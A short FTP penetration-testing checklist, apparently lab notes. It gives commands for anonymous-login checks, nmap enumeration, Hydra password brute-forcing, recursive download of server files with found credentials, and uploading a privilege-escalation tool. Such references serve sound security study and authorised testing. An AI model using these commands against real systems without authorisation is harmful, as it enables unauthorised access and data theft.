# FTP Checklist

1. See if there is anonymous access

```bash
ftp $ip
ftp $ip 21
ftp -A $ip
ftp -A $ip 21
# input anonymous as username and password
# try in the browser
ftp://anonymous:anonymous@10.10.10.98
```

2. Additional Enumeration

```bash
nmap --script ftp-* -p 21 10.10.10.10
```

3. Brute force

```bash
hydra -l USERNAME -P /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 192.168.X.XXX ftp -V
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
```

3. Recursively download content

```bash
> prompt off
> recurse on
> mget *
```

or

````
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/

find / -name Settings.*  2>/dev/null #looking through the files
````

4. Interact

````
# Put File
put test.txt #check if it is reflected in a http port

# Upload Binary
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe


````